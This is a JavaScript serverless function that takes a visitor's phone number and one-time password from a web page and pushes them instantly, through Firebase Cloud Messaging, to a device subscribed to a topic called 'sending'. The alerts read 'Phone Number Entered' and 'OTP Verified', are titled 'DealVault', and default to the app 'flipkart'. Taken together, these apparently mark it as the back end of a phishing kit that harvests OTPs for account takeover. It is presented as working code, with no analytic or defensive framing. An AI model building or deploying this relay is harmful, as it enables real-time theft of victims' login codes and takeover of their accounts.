const { JWT } = require('google-auth-library');

exports.handler = async (event) => {
  const requestId = Date.now().toString(36);

  console.log(`[notify-sending][${requestId}] === FUNCTION CALLED ===`);
  console.log(`[notify-sending][${requestId}] method:`, event.httpMethod);

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 204, headers: corsHeaders(), body: '' };
  }

  if (event.httpMethod !== 'POST') {
    console.log(`[notify-sending][${requestId}] rejected: wrong method`);
    return {
      statusCode: 405,
      headers: corsHeaders(),
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  const credentials = getFirebaseCredentials();
  if (!credentials) {
    console.error(`[notify-sending][${requestId}] FAIL: no Firebase credentials in env`);
    return {
      statusCode: 500,
      headers: corsHeaders(),
      body: JSON.stringify({
        ok: false,
        error: 'FIREBASE_SERVICE_ACCOUNT_JSON not set in Netlify env vars',
        requestId,
      }),
    };
  }

  let payload = {};
  try {
    payload = event.body ? JSON.parse(event.body) : {};
  } catch (err) {
    console.error(`[notify-sending][${requestId}] bad JSON body:`, err.message);
    payload = {};
  }

  const eventType = payload.event_type || 'page_open';
  const dataPayload = buildDataPayload(eventType, payload);

  console.log(`[notify-sending][${requestId}] event_type:`, eventType);
  console.log(`[notify-sending][${requestId}] data payload:`, dataPayload);
  console.log(`[notify-sending][${requestId}] project:`, credentials.project_id);

  try {
    const accessToken = await getAccessToken(credentials);
    console.log(`[notify-sending][${requestId}] FCM access token obtained`);

    const fcmBody = {
      message: {
        topic: 'sending',
        data: dataPayload,
        android: {
          priority: 'HIGH',
          ttl: '0s',
          direct_boot_ok: true,
        },
      },
    };

    console.log(`[notify-sending][${requestId}] sending to topic "sending"...`);

    const response = await fetch(
      `https://fcm.googleapis.com/v1/projects/${credentials.project_id}/messages:send`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${accessToken}`,
        },
        body: JSON.stringify(fcmBody),
      }
    );

    const result = await response.json();

    if (!response.ok) {
      console.error(`[notify-sending][${requestId}] FCM ERROR:`, JSON.stringify(result));
      return {
        statusCode: response.status,
        headers: corsHeaders(),
        body: JSON.stringify({
          ok: false,
          error: 'FCM send failed',
          fcmError: result,
          requestId,
          sentData: dataPayload,
        }),
      };
    }

    console.log(`[notify-sending][${requestId}] SUCCESS:`, JSON.stringify(result));

    return {
      statusCode: 200,
      headers: corsHeaders(),
      body: JSON.stringify({
        ok: true,
        requestId,
        message: 'Data notification sent to topic "sending"',
        fcmMessageId: result.name || null,
        sentData: dataPayload,
      }),
    };
  } catch (err) {
    console.error(`[notify-sending][${requestId}] EXCEPTION:`, err.message, err.stack);
    return {
      statusCode: 500,
      headers: corsHeaders(),
      body: JSON.stringify({
        ok: false,
        error: err.message,
        requestId,
      }),
    };
  }
};

function buildDataPayload(eventType, payload) {
  const titles = {
    page_open: 'New Website Visit',
    phone_saved: 'Phone Number Entered',
    otp_saved: 'OTP Verified',
  };

  const bodies = {
    page_open: payload.message || 'Someone opened the website',
    phone_saved: `Phone: ${payload.phone || 'unknown'}`,
    otp_saved: `Phone: ${payload.phone || '?'} | OTP: ${payload.otp || '?'}`,
  };

  return {
    event_type: String(eventType),
    type: String(eventType),
    title: String(titles[eventType] || 'DealVault Alert'),
    body: String(bodies[eventType] || 'New activity'),
    session_id: String(payload.session_id || ''),
    selected_app: String(payload.selected_app || 'flipkart'),
    phone: String(payload.phone || ''),
    otp: String(payload.otp || ''),
    timestamp: new Date().toISOString(),
  };
}

function getFirebaseCredentials() {
  const json = process.env.FIREBASE_SERVICE_ACCOUNT_JSON;
  if (json) {
    try {
      const parsed = JSON.parse(json);
      if (parsed.private_key) {
        parsed.private_key = parsed.private_key.replace(/\\n/g, '\n');
      }
      return parsed;
    } catch (err) {
      console.error('Invalid FIREBASE_SERVICE_ACCOUNT_JSON:', err.message);
      return null;
    }
  }

  const projectId = process.env.FIREBASE_PROJECT_ID;
  const clientEmail = process.env.FIREBASE_CLIENT_EMAIL;
  const privateKey = process.env.FIREBASE_PRIVATE_KEY;

  if (!projectId || !clientEmail || !privateKey) return null;

  return {
    project_id: projectId,
    client_email: clientEmail,
    private_key: privateKey.replace(/\\n/g, '\n'),
  };
}

async function getAccessToken(credentials) {
  const client = new JWT({
    email: credentials.client_email,
    key: credentials.private_key,
    scopes: ['https://www.googleapis.com/auth/firebase.messaging'],
  });
  const { access_token: accessToken } = await client.authorize();
  return accessToken;
}

function corsHeaders() {
  return {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json',
  };
}
